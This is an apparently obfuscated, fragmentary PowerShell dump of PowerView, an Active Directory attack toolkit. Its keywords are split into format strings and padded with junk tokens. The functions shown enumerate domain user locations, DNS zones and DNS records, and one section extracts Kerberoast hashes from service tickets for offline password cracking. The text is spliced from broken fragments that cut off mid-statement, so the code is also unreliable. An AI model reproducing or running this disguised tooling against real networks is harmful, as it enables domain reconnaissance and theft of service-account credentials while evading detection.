        YoV{SeAIJKRChIJKScoPe} = (Z3b{0}{2}{1}Z3b -f S5zSuS5z,S5zreeS5z,S5zbtS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rIJKeSULtpAgEIJKsIIJKze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sIJKeRVERIJKTIMIJKELIIJKmiT},

        [ValidateSet({Z3b{1}{0}Z3b-f S5zaclS5z,S5zDS5z}, {Z3b{1}{0}Z3b -f S5zoupS5z,S5zGrS5z}, {Z3b{0}{1}Z3b-fS5zNS5z,S5zoneS5z}, {Z3b{0}{1}Z3b -f S5zOwnS5z,S5zerS5z}, {Z3b{1}{0}Z3b-f S5zaclS5z,S5zSS5z})]
        [String]
        YoV{SEIJKcuRiTYMASIJKKs},

        [Switch]
        YoV{toIJKMIJKBsTIJKoNe},

        [Management.Automation.PSC','}{3}Z3b -fS5zitS5z,S5zAudS5z,S5zDirectoryS5z,S5zRuleS5z,S5zSystem.DirS5z,S5zviS5z,S5zySerS5z,S5zveS5z,S5zActiS5z,S5zces.S5z,S5zectorS5z) -ArgumentList YoV{IdEIJKNtIJKiTY}, YoV{aIJKdIJKRight}, YoV{audItFIJKLIJKAG}, YoV{OIJKBjEIJKcttYIJKPe}
            } elseif(YoV{oBIJKJIJKEcttyIJKpe} -ne YoV{nuIJKLl} -and YoV{iIJKNHERitaNCeTIJKyIJKPe} -ne  ( &(Z3b{2}{1}{0}Z3b -f S5zBLeS5z,S5zAriaS5z,S5zvS5z)  (Z3bQpu2Z3b+Z3b9Z3b)  ).Z3bValIJKUEZ3b::Z3bEIJKMpTyZ3b -and YoV{iIJKNHeRITEIJKdobJeCIJKTTIJKyPe} -eq YoV{nuIJKlL}) {
                &(Z3b{0}{2}{1}Z3b -f S5zNeS5z,S5zjectS5z,S5zw-ObS5z) (Z3b{0}{5}{2}{9}{1}{6}{8}{7}{4}{3}Z3b -f S5zSyS5z,S5zrviceS5z,S5ztoS5z,S5zditRuleS5z,S5zAuS5z,S5zstem.DirecS5z,S5zs.ActiS5z,S5zeDirectoryS5z,S5zvS5z,S5zrySeS5z) -ArgumentList YoV{IIJKdIJKentIJKiTY}, YoV{AdrIJKiGIJKHt}, YoV{AUdiIJKTFIJKLaG}, YoV{OIJKBJEcTIJKTYIJKpE}, YoV{iIJKNhEIJKRitANCIJKetIJKYpE}
            } elseif(YoV{oBIJKJeCtIJKTyPe} -ne YoV{nIJKUlL} -and YoV{InIJKHeRiIJKTIJKANCETYPe} -ne  (&(Z3b{2}{0}{1}Z3b -f S5z-vAS5z,S5zRIAblES5z,S5zgEtS5z)  qPU29 -VA )::Z3bEmIJKpTyZ3b -and YoV{iNIJKHEIJKRIJKiTEIJKdOBjIJKeCTType} -ne YoV{NUIJKlL}) {
                &(Z3b{0}{1}{2}Z3b -f S5zNew-OS5z,S5zbjS5z,S5zectS5z) (Z3b{2}{1}{7}{4}{0}{3}{6}{5}Z3b-fS5zcS5z,S5zs','OrEmpty()]
        [String[]]
        YoV{UIJKseIJKRidenTITy},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{UsIJKerdoIJKmAIJKiN},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{UsERlDAIJKpIJKFIlIJKTIJKEr},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{UsIJKeRIJKsEARCIJKhbIJKASe},

        [Parameter(pARAMETERsetNAME = Z3buserGrOIJKUpiDIJKeNIJKTIIJKTYZ3b)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}{2}Z3b-fS5zpNS5z,S5zGrouS5z,S5zameS5z}, {Z3b{1}{0}Z3b-fS5zoupS5z,S5zGrS5z})]
        [String[]]
        YoV{USIJKErIJKGROUPIJKIdeIJKNtitY} = (Z3b{1}{0}{3}{2}Z3b -fS5zn S5z,S5zDomaiS5z,S5znsS5z,S5zAdmiS5z),

        [Alias({Z3b{2}{3}{0}{1}Z3b-fS5zminCounS5z,S5ztS5z,S5zAS5z,S5zdS5z})]
        [Switch]
        YoV{uSEIJKRaDmiNIJKCOUIJKNT},

        [Alias({Z3b{4}{2}{0}{3}{1}Z3b -f S5zeS5z,S5ztionS5z,S5zllowDS5z,S5zlegaS5z,S5zAS5z})]
        [Switch]
        YoV{USEralLIJKoWIJKdElIJKeGAtiOn},

        [Switch]
        YoV{cIJKhecIJKkACCess},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{2}{3}{1}{4}Z3b-fS5zDomS5z,S5zlleS5z,S5zainS5z,S5zControS5z,S5zrS5z})]
        [String]
        YoV{SEIJKRIJKVER},

        [ValidateSet({Z3b{1}{0}Z3b -fS5zeS5z,S5zBasS5z}, {Z3b{0}{1}Z3b -f S5zOnS5z,S5zeLevelS5z}, {Z3b{0}{1}Z3b-fS5zSS5z,S5zubtreeS5z})]
        [String]
        YoV{SEarCIJKhscoIJKpe} = (Z3b{1}{0}{2}Z3b-fS5zrS5z,S5zSubtS5z,S5zeeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{RIJKESIJKUlTPAGesIJKizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SeIJKRVEIJKRIJKTimelIIJKMit},

        [Switch]
        YoV{toIJKmBIJKsTOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CReIJKDIJKEnTIal} =  YoV{jIJKFI}::Z3bEIJKmptYZ3b,

        [Switch]
        YoV{stOIJKpOIJKNIJKsucCess},

        [ValidateRange(1, 10000)]
        [Int]
        YoV{dIJKeIJKLAY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        YoV{jiTtIJKEr} = .3,

        [Parameter(pArAMEtERsETnAMe = Z3bshowIJKALlZ3b)]
        [Switch]
        YoV{SHOWIJKAIJKLl},

        [Switch]
        YoV{SteaIJKlTH},

        [String]
        [ValidateSet(S5zDFSS5z, S5zDCS5z, {Z3b{0}{1}Z3b -fS5zFS5z,S5zileS5z}, S5zAllS5z)]
        YoV{StEaltIJKhSOIJKUrIJKce} = S5zAllS5z,

        [Int]
        [ValidateRange(1, 100)]
        YoV{tIJKhreIJKADs} = 20
    )

    BEGIN {

        YoV{cOmIJKPutersEaRchEIJKRArIJKguMEIJKNTS} = @{
            (Z3b{2}{3}{1}{0}Z3b-fS5zsS5z,S5zrtieS5z,S5zPropS5z,S5zeS5z) = (Z3b{3}{1}{0}{2}Z3b-f S5zmS5z,S5zostnaS5z,S5zeS5z,S5zdnshS5z)
        }
        if (YoV{psboUnIJKdIJKpaIJKRAmEteRS}[(Z3b{0}{1}Z3b-fS5zDomS5z,S5zainS5z)]) { YoV{cIJKOMpuTeRSeaIJKRIJKcHeIJKRarIJKgUMIJKEnIJKTS}[(Z3b{0}{1}Z3b-fS5zDS5z,S5zomainS5z)] = YoV{dOmIJKAIn} }
        if (YoV{pSboIJKUIJKNIJKdPIJKARaMIJKETerS}[(Z3b{4}{3}{2}{1}{0}Z3b-fS5znS5z,S5ziS5z,S5zomaS5z,S5zmputerDS5z,S5zCoS5z)]) { YoV{COIJKMPUTErsearchIJKeIJKRaRGIJKUMEIJKNT','mpUIJKTErS} = @(YoV{COMIJKPIJKUterNIJKAME})
        }
        else {
            if (YoV{PSbouNdPIJKAIJKRameTIJKERS}[(Z3b{1}{0}{2}Z3b-f S5ztS5z,S5zSS5z,S5zealthS5z)]) {
                &(Z3b{1}{2}{0}{3}Z3b -f S5zrbS5z,S5zWrite-VS5z,S5zeS5z,S5zoseS5z) (S5z[S5z+S5zFiS5z+S5znd-DomainUserLocatiS5z+S5zoS5z+S5zn] S5z+S5zSS5z+S5ztealth S5z+S5zeS5z+S5znumeratS5z+S5zioS5z+S5zn S5z+S5zusinS5z+S5zg S5z+S5zsS5z+S5zource:S5z+S5z S5z+Z3bYoVStealthSourceZ3b)
                YoV{TarIJKGetCOIJKMIJKPUTIJKerarraYLiSt} = &(Z3b{1}{2}{0}Z3b -f S5zectS5z,S5zNewS5z,S5z-ObjS5z) (Z3b{2}{0}{4}{3}{1}Z3b-fS5ztem.CollS5z,S5zListS5z,S5zSysS5z,S5zctions.ArrayS5z,S5zeS5z)

                if (YoV{StIJKEALIJKTHSOIJKUIJKRce} -match (((Z3b{0}{1}{2}{3}Z3b-f S5zFilS5z,S5zeS5z,S5z{0}AlS5z,S5zlS5z))-F [Char]124)) {
                    &(Z3b{2}{0}{1}{3}{4}Z3b-f S5zVS5z,S5zerboS5z,S5zWrite-S5z,S5zsS5z,S5zeS5z) (Z3b{6}{8}{3}{7}{2}{9}{14}{4}{0}{5}{12}{11}{10}{13}{1}Z3b-fS5z foS5z,S5zsS5z,S5zseS5z,S5znd-DomaiS5z,S5zQueryingS5z,S5zr S5z,S5z[S5z,S5znUS5z,S5zFiS5z,S5zrLS5z,S5ze S5z,S5zilS5z,S5zfS5z,S5zserverS5z,S5zocation] S5z)
                    YoV{fIJKILesEIJKRverIJKSEIJKARcIJKHERARGumEIJKNts} = @{}
                    if (YoV{PSIJKBoIJKUnDIJKpaRAmeIJKTIJKeRS}[(Z3b{1}{0}Z3b-fS5znS5z,S5zDomaiS5z)]) { YoV{fILeIJKSIJKERvEIJKRsIJKEarCHerARgUMEnTs}[(Z3b{1}{0}Z3b-f S5zomainS5z,S5zDS5z)] = YoV{DIJKoMAIJKiN} }
                    if (YoV{psIJKBIJKOuNDpARAIJKmeIJKTerS}[(Z3b{2}{0}{1}{3}{4}Z3b -f S5zompS5z,S5zuterDomS5z,S5zCS5z,S5zaiS5z,S5znS5z)]) { YoV{fiLEIJKsEIJKRvIJKErSeIJKArcheIJKRARguMIJKenTS}[(Z3b{1}{0}Z3b -fS5zomainS5z,S5zDS5z)] = YoV{ComPUTIJKERdoIJKmaIJKIn} }
                   ','V{prIJKopIJKEIJKRtiES},

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rESUIJKLIJKTpAGESiIJKzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SIJKErIJKVeIJKRtimeLImIt},

        [Alias({Z3b{0}{2}{1}Z3b-f S5zRS5z,S5zOneS5z,S5zeturnS5z})]
        [Switch]
        YoV{FIJKinDONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKRIJKedEnTiaL} =   (&(Z3b{0}{1}{2}Z3b-f S5zGET-VARiS5z,S5zabS5z,S5zLES5z)  (S5zjS5z+S5zFiS5z) ).Z3bVaIJKluEZ3b::Z3beIJKmptyZ3b
    )

    PROCESS {
        YoV{SeArIJKcheRaIJKRgIJKUmEIJKNts} = @{
            (Z3b{2}{0}{1}Z3b -fS5ztS5z,S5zerS5z,S5zLDAPFilS5z) = ((Z3b{2}{5}{4}{3}{0}{1}Z3b -f S5zsS5z,S5zZone)S5z,S5z(objS5z,S5znS5z,S5zdS5z,S5zectClass=S5z))
        }
        if (YoV{pSIJKBOunDPIJKArIJKAmeIJKTeRS}[(Z3b{0}{1}Z3b -fS5zDoS5z,S5zmainS5z)]) { YoV{SeaIJKRcIJKhErARGUMeIJKNTS}[(Z3b{1}{0}Z3b -f S5zainS5z,S5zDomS5z)] = YoV{doIJKmAIJKIN} }
        if (YoV{PSIJKBoUIJKNDparIJKAmIJKETERs}[(Z3b{0}{1}Z3b-f S5zSeS5z,S5zrverS5z)]) { YoV{SIJKeaIJKRCIJKHEraRGUMEntS}[(Z3b{1}{0}Z3b -fS5zrS5z,S5zServeS5z)] = YoV{sIJKErIJKVER} }
        if (YoV{PsbOuNIJKdIJKpaRIJKAmIJKETErs}[(Z3b{2}{1}{0}Z3b-fS5zesS5z,S5zropertiS5z,S5zPS5z)]) { YoV{SIJKEarcIJKHIJKERaRGIJKUMENtS}[(Z3b{0}{1}{2}Z3b -fS5zPropeS5z,S5zrtiS5z,S5zesS5z)] = YoV{pIJKRopIJKeIJKRTIeS} }
        if (YoV{PIJKsIJKBoUnDIJKPIJKArametIJKERs}[(Z3b{4}{0}{3}{2}{1}Z3b-f S5zesS5z,S5zizeS5z,S5zgeSS5z,S5zultPaS5z,S5zRS5z)]) { YoV{seIJKARChIJKeRIJKARIJKGUmEIJKNtS}[(Z3b{2}{3}{4}{1}{0}Z3b-f S5zzeS5z,S5zSiS5z,S5zResultS5z,S5zPaS5z,S5zgeS5z)] = YoV{rESulTpAgeIJKsIIJKZE} }
        if (YoV{PSboIJKUIJKNIJKdpaRAmIJKeteRs}[(Z3b{0}{2}{4}{3}{1}Z3b -fS5zServerTiS5z,S5ztS5z,S5zmeS5z,S5ziS5z,S5zLimS5z)]) { YoV{SEAIJKRcIJKHIJKErIJKARGIJKUmeNTs}[(Z3b{4}{2}{1}{3}{0}Z3b-f S5zeLimitS5z,S5zTS5z,S5zverS5z,S5zimS5z,S5zSerS5z)] = YoV{sIJKERVERtIIJKmIJKeLimIJKIT} }
        if (YoV{PSbOUIJKNDpIJKArAmIJKeIJKTeIJKRS}[(Z3b{1}{2}{0}Z3b-fS5zialS5z,S5zCredenS5z,S5ztS5z)]) { YoV{sEIJKARcIJKhEIJKRaRIJKgUmEnts}[(Z3b{1}{2}{0}Z3b -fS5zlS5z,S5zCreS5z,S5zdentiaS5z)] = YoV{cREDeIJKNIJKTiIJKAL} }
        YoV{DNIJKSIJKsIJKeIJKArChER1} = &(Z3b{1}{2}{4}{3}{0}Z3b-f S5zearcherS5z,S5zGS5z,S5zeS5z,S5z-DomainSS5z,S5ztS5z) @SearcherArguments

        if (YoV{dNSIJKSEARIJKcHeR1}) {
            if (YoV{psBoUIJKNdIJKpaIJKRAmetIJKeRS}[(Z3b{0}{1}{2}Z3b -f S5zFS5z,S5zinS5z,S5zdOneS5z)]) { YoV{reIJKSIJKUlTs} = YoV{dNIJKSSeIJKArcHEIJKR1}.(Z3b{0}{1}Z3b -f S5zFinS5z,S5zdOneS5z).Invoke()  }
            else { YoV{RIJKEsIJKULTs} = YoV{DnSseARIJKCHIJKeR1}.(Z3b{0}{2}{1}Z3b-f S5zFS5z,S5zdAllS5z,S5zinS5z).Invoke() }
            YoV{rEIJKSULIJKTs} JGO &(Z3b{2}{0}{1}{3}Z3b-fS5ze-S5z,S5zOS5z,S5zWherS5z,S5zbjectS5z) {YoV{_}} JGO &(Z3b{2}{0}{4}{1}{3}Z3b-f S5zorEachS5z,S5zjeS5z,S5zFS5z,S5zctS5z,S5z-ObS5z) {
                YoV{oIJKUt} = &(Z3b{1}{0}{4}{3}{2}Z3b-f S5zt-LDAPPS5z,S5zConverS5z,S5zyS5z,S5ztS5z,S5zroperS5z) -Properties YoV{_}.Z3bPIJKRIJKOIJKpertiEsZ3b
                YoV{oIJKUT} JGO &(Z3b{1}{2}{0}Z3b -fS5zmberS5z,S5zAdd-S5z,S5zMeS5z) (Z3b{2}{0}{1}Z3b -f S5zoteProperS5z,S5ztyS5z,S5zNS5z) (Z3b{2}{1}{0}Z3b -f S5zeS5z,S5zeNamS5z,S5zZonS5z) YoV{OIJKUT}.Z3bNIJKAmeZ3b
                YoV{oIJKUT}.Z3bpIJKSOBJEIJKctZ3b.Z3bTYpeIJKNIJKAmESZ3b.(Z3b{1}{0}Z3b -fS5ztS5z,S5zInserS5z).Invoke(0, (Z3b{1}{0}{2}{3}Z3b -f S5zSS5z,S5zPowerView.DNS5z,S5zZS5z,S5zoneS5z))
                YoV{oIJKUt}
            }

            if (YoV{rIJKeIJKsuLtS}) {
                try { YoV{rIJKeIJKsULTS}.(Z3b{1}{0}{2}Z3b -fS5zsS5z,S5zdispoS5z,S5zeS5z).Invoke() }
                catch {
                    &(Z3b{0}{3}{1}{2}Z3b-fS5zWS5z,S5zte-VerS5z,S5zboseS5z,S5zriS5z) (S5z[Get-DoS5z+S5zmS5z+S5zaS5z+S5zinDFSSS5z+S5zhare] S5z+S5zES5z+S5zrrS5z+S5zor S5z+S5zdiS5z+S5zsposinS5z+S5zg S5z+S5zofS5z+S5z S5z+S5ztS5z+S5zhe S5z+S5zResulS5z+S5zts S5z+S5zobS5z+S5zject:S5z+S5z S5z+Z3bYoV_Z3b)
                }
            }
            YoV{dNSSEARIJKChIJKeIJKR1}.(Z3b{0}{1}Z3b-f S5zdS5z,S5zisposeS5z).Invoke()
        }

        YoV{sEArcHIJKEIJKRAIJKRguMIJKentS}[(Z3b{3}{1}{4}{0}{2}Z3b-f S5zeS5z,S5zaseS5z,S5zfixS5z,S5zSearchBS5z,S5zPrS5z)] = (Z3b{1}{4}{5}{3}{2}{0}Z3b-f S5zesS5z,S5zCN=MiS5z,S5zomainDnsZonS5z,S5zDS5z,S5zcrosoftDNS5z,S5zS,DC=S5z)
        YoV{dIJKNIJKsSeIJKArChIJKEr2} = &(Z3b{2}{3}{1}{0}Z3b -f S5zainSearcherS5z,S5zmS5z,S5zGeS5z,S5zt-DoS5z) @SearcherArguments

        if (YoV{dIJKNIJKssEARchIJKEr2}) {
            try {
                if (YoV{PsbOunDpAIJKRIJKAIJKMEtErS}[(Z3b{2}{1}{0}Z3b -fS5zdOneS5z,S5znS5z,S5zFiS5z)]) { YoV{rEIJKsults} = YoV{dnsIJKSIJKEaRcheR2}.(Z3b{1}{2}{0}Z3b -f S5zeS5z,S5zFinS5z,S5zdOnS5z).Invoke() }
                else { YoV{rEIJKsULIJKTS} = YoV{DNSSIJKEaIJKRCIJKHeIJKR2}.(Z3b{2}{1}{0}Z3b-f S5zlS5z,S5zdAlS5z,S5zFinS5z).Invoke() }
                YoV{rIJKeIJKsUlTS} JGO &(Z3b{3}{2}{0}{1}Z3b -fS5ze-ObjecS5z,S5ztS5z,S5zerS5z,S5zWhS5z) {YoV{_}} JGO &(Z3b{2}{1}{3}{0}Z3b -f S5zectS5z,S5zrEacS5z,S5zFoS5z,S5zh-ObjS5z) {
                    YoV{OIJKUt} = &(Z3b{1}{2}{3}{4}{0}Z3b -fS5zyS5z,S5zConveS5z,S5zrt-LDAPPS5z,S5zropeS5z,S5zrtS5z) -Properties YoV{_}.Z3bProIJKpIJKERIJKTieSZ3b
                    YoV{OIJKUT} JGO &(Z3b{1}{2}{0}Z3b-f S5zmberS5z,S5zAddS5z,S5z-MeS5z) (Z3b{3}{0}{2}{1}Z3b-fS5zeProS5z,S5ztyS5z,S5zperS5z,S5zNotS5z) (Z3b{2}{1}{0}Z3b -f S5zeS5z,S5zNamS5z,S5zZoneS5z) YoV{oIJKUT}.Z3bnIJKAmEZ3b
                    YoV{oIJKUT}.Z3bPsIJKoIJKBjECtZ3b.Z3btYPENaIJKMESZ3b.(Z3b{0}{1}{2}Z3b-fS5zIS5z,S5znseS5z,S5zrtS5z).Invoke(0, (Z3b{2}{5}{3}{1}{0}{4}Z3b-fS5znS5z,S5zoS5z,S5zPS5z,S5zDNSZS5z,S5zeS5z,S5zowerView.S5z))
                    YoV{oIJKUt}
                }
                if (YoV{rEsUIJKlIJKTs}) {
                    try { YoV{RIJKESUltS}.(Z3b{2}{1}{0}Z3b -f S5zoseS5z,S5zspS5z,S5zdiS5z).Invoke() }
                    catch {
                        &(Z3b{2}{1}{3}{4}{0}Z3b -fS5zrboseS5z,S5zeS5z,S5zWritS5z,S5z-S5z,S5zVeS5z) (S5z[Get-DS5z+S5zomainDS5z+S5zNSZoS5z+S5znS5z+S5ze] S5z+S5zES5z+S5zrror S5z+S5zdS5z+S5zisposingS5z+S5z S5z+S5zofS5z+S5z S5z+S5zthS5z+S5ze S5z+S5zRS5z+S5zesultS5z+S5zs S5z+S5zobS5z+S5zject: S5z+Z3bYoV_Z3b)
                    }
                }
            }
            catch {
                &(Z3b{1}{0}{2}{3}Z3b-f S5zrite-VS5z,S5zWS5z,S5zeS5z,S5zrboseS5z) (((Z3b{2}{6}{10}{0}{7}{11}{4}{1}{9}{3}{5}{8}Z3b -fS5zccessS5z,S5zrS5z,S5z[Get-DS5z,S5zsoftS5z,S5zicS5z,S5zDNS,DC=DomainDS5z,S5zomainDNSZone] ErrorS5z,S5zingS5z,S5znsZonesOjoS5z,S5zoS5z,S5z aS5z,S5z OjoCN=MS5z)).Z3bRIJKeIJKPLAcEZ3b(S5zOjoS5z,[sTRiNG][Char]39))
            }
            YoV{dnsSEIJKArIJKChIJKeIJKR2}.(Z3b{1}{0}Z3b-f S5zoseS5z,S5zdispS5z).Invoke()
        }
    }
}


function get-dOIJKMIJKAIIJKNDNsREIJKcIJKOrD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{2}{0}Z3b-fS5zsS5z,S5zPSShoulS5z,S5zdProcesS5z}, S5zS5z)]
    [OutputType({Z3b{3}{2}{0}{4}{1}Z3b -f S5z.DNSReS5z,S5zordS5z,S5zViewS5z,S5zPowerS5z,S5zcS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSitION = 0,  maNDaTOrY = YoV{TrIJKUe}, VaLUefroMpIpeline = YoV{tIJKRue}, valUEFromPiPEliNeByPRoPeRTynAMe = YoV{trIJKUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{ZoNIJKenIJKAme},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DOIJKmIJKAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}{2}{3}Z3b-fS5zDomS5z,S5zainCoS5z,S5zntrolS5z,S5zlerS5z})]
        [String]
        YoV{seIJKRVIJKER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{PrIJKoIJKpertiEs} = (Z3b{4}{0}{8}{11}{10}{3}{6}{7}{12}{5}{2}{9}{1}Z3b-f S5zdistingS5z,S5zdS5z,S5zencreatedS5z,S5zsrS5z,S5zname,S5z,S5zhS5z,S5zecordS5z,S5z,S5z,S5zuishednaS5z,S5z,whenchangeS5z,S5ze,dnS5z,S5zmS5z,S5zwS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{rESIJKULTIJKPIJKAGeSIIJKZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SIJKErIJKVIJKeRTIMIJKeIJKLimiT},

        [Alias({Z3b{2}{0}{1}Z3b-f S5zrnS5z,S5zOneS5z,S5zRetuS5z})]
        [Switch]','bjectOwner] S5z+S5zErrorS5z+S5z S5z+S5zpS5z+S5zarS5z+S5zsing S5z+S5zownS5z+S5zerS5z+S5z S5z+S5zidentitS5z+S5zy S5z+Z3bS5zYoVOwnerIdentityS5zZ3b)
        }
    }

    PROCESS {
        if (YoV{OWNEriIJKDenTIJKITyREIJKFErIJKEncE}) {
            YoV{seaRCHEraIJKRIJKGum','}{3}{2}Z3b -fS5ziteDataS5z,S5zWrS5z,S5z','KER})
                YoV{GIJKRoIJKUp}.(Z3b{1}{0}Z3b-fS5zaveS5z,S5zSS5z).Invoke(','                   
                    if (YoV{OIJKUt}.Z3bDIJKNsRecIJKOrDZ3b -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        YoV{RIJKecORD} = &(Z3b{4}{3}{1}{0}{2}Z3b -f S5zoS5z,S5zt-DNSRecS5z,S5zrdS5z,S5zrS5z,S5zConveS5z) -DNSRecord YoV{OIJKUT}.Z3bDNSrIJKECIJKordZ3b[0]
                    }
                    else {
                        YoV{rEIJKcorD} = &(Z3b{0}{2}{4}{3}{5}{1}Z3b-f S5zCS5z,S5zrdS5z,S5zonverS5z,S5zeS5z,S5zt-DNSRS5z,S5zcoS5z) -DNSRecord YoV{oIJKUT}.Z3bdNSRIJKEcIJKORdZ3b
                    }

                    if (YoV{RECoIJKRD}) {
                        YoV{RecIJKord}.Z3bpSOIJKBJeIJKCTZ3b.Z3bPRoPeIJKRIJKTiEsZ3b JGO &(Z3b{2}{1}{4}{0}{3}Z3b-f S5zbS5z,S5zrEachS5z,S5zFoS5z,S5zjectS5z,S5z-OS5z) {
                            YoV{oIJKUT} JGO &(Z3b{1}{0}{2}Z3b -fS5zd-MembS5z,S5zAdS5z,S5zerS5z) (Z3b{2}{1}{3}{0}Z3b -fS5zopertyS5z,S5zteS5z,S5zNoS5z,S5zPrS5z) YoV{_}.Z3bNIJKAmEZ3b YoV{_}.Z3bvIJKAlUEZ3b
                        }
                    }

                    YoV{OIJKUT}.Z3bpsOIJKBIJKJecTZ3b.Z3bTYpEIJKNAmIJKesZ3b.(Z3b{2}{0}{1}Z3b -fS5zeS5z,S5zrtS5z,S5zInsS5z).Invoke(0, (Z3b{1}{0}{2}{3}{4}Z3b -f S5zew.DNSS5z,S5zPowerViS5z,S5zRecS5z,S5zoS5z,S5zrdS5z))
                    YoV{OIJKUT}
                }
                catch {
                    &(Z3b{2}{3}{1}{0}Z3b-fS5zgS5z,S5zninS5z,S5zWritS5z,S5ze-WarS5z) (S5z[Get-DoS5z+S5zmainDNSRS5z+S5zecS5z+S5zord] S5z+S5zES5z+S5zrror:S5z+S5z S5z+Z3bYoV_Z3b)
                    YoV{oIJKUT}
                }
            }

            if (YoV{RESIJKULIJKTS}) {
                try { YoV{R','TcheS}.Z3bdAtAIJKTIJKOEndZ3b.(Z3b{0}{2}{1}Z3b-f S5zSuS5z,S5zringS5z,S5zbstS5z).Invoke(YoV{CIJKiPheIJKRtEIJKxTLEn}*2, 4) -ne (Z3b{1}{0}Z3b -fS5z2S5z,S5zA48S5z)) {
                        &(Z3b{1}{2}{0}{3}Z3b -fS5z-WaS5z,S5zWritS5z,S5zeS5z,S5zrningS5z) Z3bError parsing ciphertext for the SPN  YoV(YoVTicket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq Z3b
                        YoV{haIJKSh} = YoV{nIJKUlL}
                        YoV{OIJKUT} JGO &(Z3b{0}{1}{3}{2}Z3b -fS5zAdd-S5z,S5zMeS5z,S5zerS5z,S5zmbS5z) (Z3b{2}{3}{1}{0}Z3b-f S5zrtyS5z,S5zpropeS5z,S5zNoS5z,S5zteS5z) (Z3b{3}{1}{2}{0}Z3b-f S5ztreamS5z,S5zexS5z,S5zSS5z,S5zTicketByteHS5z) (  (&(Z3b{2}{1}{0}{3}Z3b-f S5zlS5z,S5ziAbS5z,S5zgET-VaRS5z,S5zES5z) (S5zAS5z+S5zePsiS5z) -VALUEonlY  )::(Z3b{0}{2}{1}Z3b-f S5zToSS5z,S5zngS5z,S5ztriS5z).Invoke(YoV{TiCKeTIJKBYtIJKeSIJKTReIJKAM}).(Z3b{0}{2}{1}Z3b-fS5zRepS5z,S5zaceS5z,S5zlS5z).Invoke(S5z-S5z,S5zS5z))
                    } else {
                        YoV{HAIJKsh} = Z3bYoV(YoVCipherText.Substring(0,32))IJKYoVYoV(YoVCipherText.Substring(32))Z3b
    ','aMeTeRsEtnAmE = {Z3b{1}{0}Z3b -fS5zPS5z,S5zLDAS5z})]
    Param(
        [Parameter(pOSiTION = 0, VAlUeFrOmpipElINe = YoV{tIJKRUE}, vaLUEfROmPIPeLINEByPrOPeRtynAMe = YoV{tIJKRUe})]
        [Alias({Z3b{1}{0}Z3b-f S5zameS5z,S5zNS5z})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dOIJKmaIJKiN},

        [Parameter(paRaMeTErsEtName = S5zAPIS5z)]
        [Switch]
        YoV{AIJKPi},

        [Parameter(PARAmeTErsEtNAme = S5zNETS5z)]
        [Switch]
        YoV{nIJKEt},

        [Parameter(pARamEteRSEtNAMe = Z3bldIJKAPZ3b)]
        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b -f S5zrS5z,S5zFilteS5z})]
        [String]
        YoV{lIJKDapFIlTIJK','ssistance OS5z,S5zBS5z,S5z ContS5z,S5zpeS5z,S5zrS5z,S5ztorsS5z,S5z0}AS5z)) -F  [cHaR]92) }
                    (Z3b{0}{1}Z3b -f S5zDS5z,S5zefaultS5z) {
                        &(Z3b{1}{4}{3}{2}{0}Z3b -f S5zeS5z,S5zConvS5z,S5z-ADNamS5z,S5zrtS5z,S5zeS5z) -Identity YoV{tArIJKGeIJKTSIJKid} @ADNameArguments
                    }
                }
            }
            catch {
                &(Z3b{0}{2}{3}{1}Z3b-fS5zWS5z,S5zboseS5z,S5zrite-VS5z,S5zerS5z) (S5z[S5z+S5zConS5z+S5zvertS5z+S5zFroS5z+S5zmS5z+S5z-SID] S5z+S5zES5z+S5zrrorS5z+S5z S5z+S5zcS5z+S5zonvS5z+S5zertinS5z+S5zg S5z+S5zSS5z+S5zID S5z+Z3bS5zYoVTargetSidS5z Z3b+S5z: S5z+Z3bYoV_Z3b)
            }
        }
    }
}


function cIJKonVerTIJK-AdNAme {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{5}{2}{9}{0}{10}{8}{6}{1}{7}{4}Z3b-fS5zcessS5z,S5ziS5z,S5zeShouldPS5z,S5zPS5z,S5znsS5z,S5zSUsS5z,S5zgFunctS5z,S5zoS5z,S5zChanginS5z,S5zroS5z,S5zForStateS5z}, S5zS5z)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mAnDAtorY = YoV{TrIJKUE}, VAluefromPIpELInE = YoV{tIJKRue}, valUefroMPipELINEBYPrOPErTYNAme = YoV{TrIJKUE})]
        [Alias({Z3b{0}{1}Z3b -fS5zNS5z,S5zameS5z}, {Z3b{1}{2}{0}Z3b-fS5zeS5z,S5zObjS5z,S5zectNamS5z})]
        [String[]]
        YoV{iDEIJKNtIJKITy},

        [String]
